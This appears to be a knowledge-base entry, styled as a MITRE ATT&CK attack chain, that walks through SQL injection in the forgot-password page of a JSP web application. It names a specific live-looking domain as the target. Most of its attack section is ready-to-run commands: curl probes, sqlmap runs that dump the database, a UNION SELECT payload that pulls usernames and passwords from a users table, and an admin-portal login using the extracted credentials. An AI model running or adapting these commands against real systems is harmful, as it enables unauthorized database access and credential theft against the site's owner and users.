---
id: ac-uuid-001
name: >-
  SQL Injection via Forgot Password Endpoint Leading to Unauthorized Database
  Access
tags:
  - sqli
  - web
  - java
  - jsp
  - database-access
type: attack_chain
tools:
  - '[[tools/sqlmap]]'
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Identify-SQLi-in-Forgot-Password-Endpoint]]'
  - '[[procedures/Inject-SQL-Payload-to-Extract-Data]]'
  - '[[procedures/Escalate-to-Admin-Portal-Access]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.522Z'
description: >-
  A multi-stage attack exploiting SQL injection in the forgot password
  functionality of a JSP-based web application to gain unauthorized access to
  database contents and potentially the administrator portal.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# SQL Injection via Forgot Password Endpoint Leading to Unauthorized Database Access

Multi-stage attack chain demonstrating exploitation of SQL injection in the forgot password endpoint of a JSP-based web application, leading to unauthorized database access and potential administrator portal compromise.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Identify Vulnerable Endpoint] --> B[Inject SQL Payload]
    B --> C[Extract Data and Escalate Access]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/sqlmap]]
- [[tools/Burp-Suite]]

### Target Environment

- Web platform with JSP-based application (e.g., Java servlet environment)
- Exposed forgot password endpoint (e.g., /forgot_password.jsp)
- Network access to the target URL (e.g., https://gmmovinparts.com)

### Initial Access Requirements

- No prior credentials needed; public-facing endpoint
- Basic network connectivity to the target
- No elevated privileges required for initial testing

## Detailed Attack Procedures

### Step 1: Identify Vulnerable Endpoint
procedure: [[procedures/Identify-SQLi-in-Forgot-Password-Endpoint]]

**Objective**: Locate and test the forgot password endpoint for SQL injection vulnerabilities by manipulating user-supplied inputs.

**Instructions**: Navigate to the forgot password page and use [[commands/curl-basic-request]] to send a test request with a single quote to check for errors indicating SQLi:

```bash
curl -X POST https://gmmovinparts.com/forgot_password.jsp -d "email='" -v
```

If an SQL error is returned (e.g., syntax error near '''), proceed to payload testing with [[commands/sqlmap-test]]:

```bash
sqlmap -u "https://gmmovinparts.com/forgot_password.jsp" --data="email=test@test.com" --batch
```

**Expected Output**: Database error messages or sqlmap confirmation of injectable parameters.

**Success Indicators**:
- SQL syntax errors in response
- sqlmap detects injectable 'email' parameter

### Step 2: Inject SQL Payload to Extract Data
procedure: [[procedures/Inject-SQL-Payload-to-Extract-Data]]

**Objective**: Craft and inject SQL payloads to dump database contents, such as user tables or sensitive data.

**Instructions**: Use [[commands/sqlmap-dump]] to enumerate and extract database information:

```bash
sqlmap -u "https://gmmovinparts.com/forgot_password.jsp" --data="email=test@test.com" --dbms=mysql --dump --batch
```

For manual testing, inject a union-based payload with [[commands/curl-union-payload]]:

```bash
curl -X POST https://gmmovinparts.com/forgot_password.jsp -d "email=admin' UNION SELECT 1,username,password FROM users--" -v
```

**Expected Output**: Leaked database records, such as usernames and hashed passwords.

**Success Indicators**:
- Successful data dump from sqlmap
- Response includes database column data

### Step 3: Escalate to Admin Portal Access
procedure: [[procedures/Escalate-to-Admin-Portal-Access]]

**Objective**: Leverage extracted data to access the administrator portal or related functionalities.

**Instructions**: Use extracted credentials with [[commands/curl-admin-login]] to attempt admin portal login:

```bash
curl -X POST https://gmmovinparts.com/admin/login.jsp -d "username=admin&password=extracted_hash" -c cookies.txt -v
```

If successful, explore the portal for further actions using [[commands/httpx-probe]] to verify admin endpoints:

```bash
httpx -l admin-endpoints.txt -status-code
```

**Expected Output**: Successful authentication and access to admin dashboard.

**Success Indicators**:
- HTTP 200 on admin login
- Access to restricted admin features

## Attack Chain Summary

### Key Achievements

1. Identified SQLi in forgot_password.jsp due to unvalidated input
2. Extracted database contents including potential admin credentials
3. Gained unauthorized access to the administrator portal

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
